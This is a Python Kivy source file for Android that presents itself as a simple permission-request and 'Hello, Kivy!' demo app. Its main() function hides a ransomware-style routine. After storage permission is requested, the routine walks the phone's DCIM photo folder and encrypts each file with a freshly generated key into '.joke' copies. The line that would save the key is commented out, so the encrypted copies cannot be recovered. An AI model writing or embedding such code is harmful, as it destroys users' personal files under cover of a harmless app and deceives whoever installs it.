from cryptography.fernet import Fernet
import os
from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.utils import platform

class PermissionExampleApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical')
        button = Button(text='Request Permission', on_press=self.request_permission)
        layout.add_widget(button)
        return layout

    def request_permission(self, instance):
        if platform == 'android':
            from android.permissions import request_permission, Permission
            request_permission(Permission.READ_EXTERNAL_STORAGE, self.on_permission_result)

    def on_permission_result(self, permissions, grant_results):
        if all(grant_results):
            print("Permission granted!")
        else:
            print("Permission denied!")


class MyApp(App):
    def build(self):
        return Button(text='Hello, Kivy!', on_press=self.on_button_press)

    def on_button_press(self, instance):
        print('Button pressed!')


def main():
        
    def utpann():
        return Fernet.generate_key()
    
    def sarvanash(file, key):
        try:    
            with open(file, 'rb') as file_raw:
                
                data = file_raw.read()

            fernet = Fernet(key)
            encrypted_data = fernet.encrypt(data)

            with open(file + ".joke", 'wb') as file_enc:
                file_enc.write(encrypted_data)
        except:
            pass        
    
    files = []
    
    for file in os.listdir("/storage/emulated/0/DCIM"):
        if os.path.isfile(file):
            files.append(file)
    print(files)
    key = utpann()

    # with open('thekey.key', 'wb') as key_file:
    #     key_file.write(key)

    for file in files:
        sarvanash(file, key)
        print(file + " encrypted successfully!")

if __name__ == '__main__':
    PermissionExampleApp().run()
    main()
    MyApp().run()


